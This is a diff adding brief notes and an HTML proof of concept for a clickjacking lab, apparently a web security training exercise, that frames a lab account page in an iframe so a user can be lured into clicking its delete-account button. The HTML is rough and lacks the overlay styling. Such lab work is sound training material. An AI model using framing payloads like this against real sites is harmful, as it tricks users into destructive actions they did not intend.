@@ -1,0 +1,16 @@
+This lab contains login functionality and a delete account button that is protected by a CSRF token.
+
+Make the user Click some button 
+
+for that we will put some text over the button and make user click on the text 
+
+
+<html>
+<head>
+<title>ClickJacking PoC</title>
+</head>
+<div>Test Me</div>
+
+<iframe src="https://0aa9003b0445d8488082f3da004a00d6.web-security-academy.net/my-account?id=wiener" height="450" width="1000"></iframe>
+</body>
+</html>
